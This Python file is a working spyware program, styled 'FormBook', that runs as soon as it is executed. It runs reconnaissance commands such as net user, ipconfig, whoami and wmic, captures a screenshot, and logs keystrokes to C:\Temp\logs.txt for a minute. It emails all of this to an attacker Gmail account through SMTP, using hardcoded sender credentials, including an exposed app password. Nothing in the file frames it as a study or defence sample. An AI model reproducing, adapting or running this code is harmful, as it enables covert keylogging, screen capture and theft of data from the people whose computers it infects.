import time
import random
from email.message import EmailMessage
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
import io
import pyautogui
import os
import subprocess
import smtplib
from pynput.keyboard import Key , Listener



def Credentials():
    sender = "samoraiitanhaii313@gmail.com"
    password = "noix wdxf whwg hvbx"
    receiver = "samoraiivtanhaii313@gmail.com"
    return sender , password , receiver


class FormBook:
    def SC_Function(self):
        sender,password,receiver = Credentials()
        screen = pyautogui.screenshot()
        byte = io.BytesIO()
        screen.save(byte,format="PNG")
        byte.seek(0)

        try:
            msg = MIMEMultipart()
            msg["From"] = sender
            msg["To"] = receiver
            msg["Subject"] = "Screen shot from target PC ."

            part = MIMEBase("application", "octet-stream")
            part.set_payload(byte.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", 'attachment; filename="screenshot.png"')
            msg.attach(part)


            try:
                server = smtplib.SMTP("smtp.gmail.com",port=587)
                server.starttls()
                server.login(sender,password)
                server.sendmail(sender,receiver,msg.as_string())
                server.quit()
                print("Screen shot sent Successfully .")
            except Exception as servererror:
                print(f"Error :{servererror}")
        except Exception as e:
            print(f"Failed to Sent Email : {e}")


    def information(self):
        sender,password,receiver = Credentials()
        list_of_commands = [
            "dir",
            "net user",
            "ipconfig /all",
            "netstat /a",
            "whoami",
            "uname -a",
            "ps aux",
            "tasklist",
            "ls -la",
            "arp -a",
            "wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list",
            "wmic bios get Manufacturer,SMBIOSBIOSVersion,ReleaseDate,SerialNumber /format:list",
            "wmic baseboard get Manufacturer,Product,SerialNumber /format:list",
            "wmic memorychip get BankLabel,Capacity,Speed,Manufacturer /format:list",
            "wmic diskdrive get Model,InterfaceType,Size,SerialNumber /format:list",

            "lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,MODEL",
            "sudo dmidecode -t system",
            "lspci -vvv",
            "system_profiler SPHardwareDataType SPStorageDataType SPDisplaysDataType SPAudioDataType",
            "system_profiler -detailLevel mini SPHardwareDataType SPStorageDataType",
            "sysctl -n machdep.cpu.brand_string",

        ]

        body = ""
        for cmd in list_of_commands:
            try:
                result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
                body += ">>>>>>>>>>>>>>>>>>>>>>\n"
                body += result.stdout + "\n\n"
                if result.stderr:
                    body += "ERROR:\n" + result.stderr + "\n\n"
            except Exception as e:
                body += f"Failed to run {cmd}: {e}\n\n"


        msg = MIMEMultipart()
        msg["from"] = sender
        msg["to"] = receiver
        msg["subject"] = "Information From Target PC"
        part = MIMEText(body, "plain")
        msg.attach(part)

        try:
            server = smtplib.SMTP("smtp.gmail.com",port=587)
            server.starttls()
            server.login(sender,password)
            server.send_message(msg)
            server.quit()
            print("Email Sent Succesfully .")

        except Exception as e:
            print(f"Failed to Sent Email : {e}")

    def get_key(self, key):
        path = "C:\\Temp"
        file = "logs.txt"
        full = os.path.join(path, file)

        if not os.path.exists(path):
            os.makedirs(path)
            print("Directory Created Successfully ..")

        if not os.path.exists(full):
            open(full, "w", encoding="utf-8").close()
            time.sleep(random.randint(1, 3))
            print("File Created Successfully ..")

        with open(full, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.write("[BACKSPACE]")
            elif hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{str(key)}]")

    def start(self):
        # فرض می‌کنیم تابع Credentials اطلاعات لازم را برمی‌گرداند
        sender, password, receiver = Credentials()

        with Listener(on_press=self.get_key) as listener:
            listener.join(timeout=60)

        msg = EmailMessage()
        msg["Subject"] = "file log"
        msg["From"] = sender
        msg["To"] = receiver
        msg.set_content("logger file .")

        # اضافه کردن فایل
        file_path = "C:\\Temp\\logs.txt"
        with open(file_path, "rb") as f:
            file_data = f.read()
            file_name = os.path.basename(file_path)

        msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)

        # ارسال با SMTP (مثال: Gmail)
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender, password)
            server.send_message(msg)

        print("email Sent.")


C = FormBook()
C.information()
C.SC_Function()
C.start()